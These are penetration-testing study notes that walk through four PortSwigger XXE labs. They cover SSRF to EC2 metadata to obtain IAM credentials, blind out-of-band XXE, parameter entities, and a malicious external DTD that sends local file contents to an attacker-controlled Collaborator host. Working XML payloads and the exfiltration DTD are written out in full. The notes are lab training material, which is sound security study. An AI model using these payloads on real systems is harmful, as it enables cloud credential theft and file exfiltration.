# ██╗ ██╗██╗ ██╗███████╗

# ╚██╗██╔╝╚██╗██╔╝██╔════╝

# ╚███╔╝ ╚███╔╝ █████╗

# ██╔██╗ ██╔██╗ ██╔══╝

# ██╔╝ ██╗██╔╝ ██╗███████╗

# ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝

> **XML eXternal Entity Injection** — _Web Application Penetration Testing Notes_

---

```
┌─────────────────────────────────────────────────────────────┐
│  ⚠  AUTHORIZED TESTING ONLY  ·  PORTSWIGGER LAB SERIES  ⚠  │
└─────────────────────────────────────────────────────────────┘
```

---

## 🗂️ TABLE OF CONTENTS

```
  [01] ──── XXE → SSRF Attacks
  [02] ──── Blind XXE · Out-of-Band Interaction
  [03] ──── Blind XXE · XML Parameter Entities
  [04] ──── Blind XXE · Malicious External DTD Exfiltration
```

---

## ░░ 01 ░░ LAB — EXPLOITING XXE TO PERFORM SSRF ATTACKS

> 🔗 `https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf`

**Concept:**  
Exploit XXE to make the server fetch an internal URL (EC2 metadata service at `http://169.254.169.254/`), retrieving the IAM `SecretAccessKey` from `/latest/meta-data/iam/security-credentials/admin`.

---

### ⚙️ Step-by-Step Exploitation

```
  1.  Intercept the "Check stock" POST request in Burp Suite
      after visiting a product page.

  2.  Insert the DOCTYPE with an external entity targeting
      the metadata root — between the XML declaration
      and <stockCheck>.

  3.  Replace <productId> value with &xxe;
      → Response shows "Invalid product ID:" + metadata
        endpoints  (e.g., ami-id, hostname)

  4.  Iterate the URL path:
        /latest/meta-data/
        /latest/meta-data/iam/
        /latest/meta-data/iam/security-credentials/
        /latest/meta-data/iam/security-credentials/admin
        → Returns JSON with AccessKeyId, SecretAccessKey, Token
```

---

### 💉 Payload Examples

```xml
<!-- Stage 1 — Enumerate metadata root -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```

```xml
<!-- Stage 2 — Extract IAM credentials -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```

---

### 📋 EC2 Metadata Notes

|Key|Detail|
|---|---|
|Directory response|Plain text list of endpoints|
|File response|Specific value or JSON|
|Version path|Use `latest` to avoid outdated paths|
|IPv6 alternative|`[fd00:ec2::254]` on supported instances|
|Throttle limit|~1024 PPS — avoid rapid requests|

---

---

## ░░ 02 ░░ LAB — BLIND XXE WITH OUT-OF-BAND INTERACTION

**Concept:**  
The XML parser processes external entities but does **not** reflect content in the response. Vulnerability is confirmed via external network interactions (DNS lookups / HTTP requests) captured by Burp Collaborator.

---

### ⚙️ Exploitation Steps

```
  1.  Visit a product page → click "Check stock"
      → Intercept POST in Burp Suite Professional

  2.  Insert DOCTYPE between XML declaration and <stockCheck>:
        <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM
          "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
      (Right-click to insert a Collaborator payload)

  3.  Replace <productId> value with &xxe;
      → Forward the request

  4.  Poll Burp Collaborator
      → DNS + HTTP interactions confirm blind XXE
```

---

### 💉 Complete Payload Example

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

---

### 🔍 Detection Notes

```
  ·  Academy labs block arbitrary external domains
     → Must use Burp Collaborator's public server
  ·  Interactions appear seconds after polling
  ·  Local tests (http://127.0.0.1) may not generate
     observable traffic
  ·  OOB payloads (e.g., oastify.com) mimic Collaborator
     for confirmation outside labs
  ·  Proves exploitation without visible feedback
     → Enables further data exfiltration via repeated
       interactions
```

---

---

## ░░ 03 ░░ LAB — BLIND XXE VIA XML PARAMETER ENTITIES

> 🔗 `https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities`

**Concept:**  
Regular external entities are filtered/stripped. Use a **parameter entity** (prefixed with `%`) expanded inside the DOCTYPE itself — not in `productId` — to make an OOB HTTP/DNS request.

---

### ❌ Why Regular Entities Fail

```
  ·  App blocks standard entities like:
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ·  Payloads using &xxe; in productId → stripped / rejected
  ·  No file contents, no external interaction returned
     (even if parser is otherwise vulnerable)
```

---

### ✅ Correct Parameter-Entity Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN">
  %xxe;
]>
<stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>
```

> `%xxe;` is expanded **while parsing the DTD**, causing the server to resolve and request the URL — even though no normal `&xxe;` entity appears in the body.

---

### 📋 Steps to Complete the Lab

```
  1.  Intercept the "Check stock" request
  2.  Replace DOCTYPE + body with the parameter-entity
      payload above → Send it
  3.  Open Burp Collaborator tab → "Poll now"
  4.  DNS + HTTP interactions from lab server to your
      Collaborator domain confirm blind XXE ✓
```

---

---

## ░░ 04 ░░ LAB — BLIND XXE EXFILTRATION VIA MALICIOUS EXTERNAL DTD

> 🔗 `https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration`

**Concept:**  
Create a malicious DTD on a server you control. The DTD defines parameter entities to **read a local file** and **send its content** via a URL to your Burp Collaborator or external domain. A parameter entity in the XML input includes and expands this external DTD, triggering the attack.

---

### 🔑 Key Exploit Steps

#### `1.` Create the Malicious DTD (`test.dtd`)

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

|Entity|Role|
|---|---|
|`%file`|Reads content of local file `/etc/hostname`|
|`%eval`|Declares `exfil` entity with URL containing the file content as query param|
|`%exfil`|Triggers the HTTP request to your server with the file data|

---

#### `2.` Upload and Host the DTD File

```
  Host on your exploit server, e.g.:
  https://exploit-<ID>.exploit-server.net/test.dtd
```

---

#### `3.` Craft XML Payload Referencing the External DTD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "https://exploit-<ID>.exploit-server.net/test.dtd">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>2</storeId>
</stockCheck>
```

> This declaration **loads the malicious DTD** and expands its contents during XML parsing.

---

#### `4.` Send the Payload and Poll Collaborator

```
  1.  Intercept "Check stock" POST with Burp Suite
  2.  Replace XML body with the crafted payload → Send
  3.  Application fetches DTD → processes entities
      → issues HTTP request to Burp Collaborator
        (or controlled domain)
  4.  Check Collaborator "Poll now"
      → Inbound HTTP request contains exfiltrated
        file content in the query string ✓
```

---

### 📊 Recap of the Attack

|Step|Description|
|---|---|
|**Malicious DTD**|Reads local file → triggers external HTTP request with file data|
|**Host DTD**|Upload the DTD to a server you control|
|**XML Payload**|References the external DTD using parameter entity syntax|
|**Data Exfiltration**|Detect HTTP to Burp Collaborator containing file contents|

> _This method allows blind exfiltration of file contents despite no direct output in responses, leveraging external DTDs and parameter entity expansions._

---

```
╔══════════════════════════════════════════════════════════════╗
║  ■ ALWAYS test in authorized environments (e.g. lab VMs)    ║
║  ■ Use Burp Suite Professional for Collaborator features     ║
║  ■ Never run XXE payloads against production systems         ║
╚══════════════════════════════════════════════════════════════╝
```

---

_Web Application Penetration Test · XXE Injection Module · PortSwigger Labs_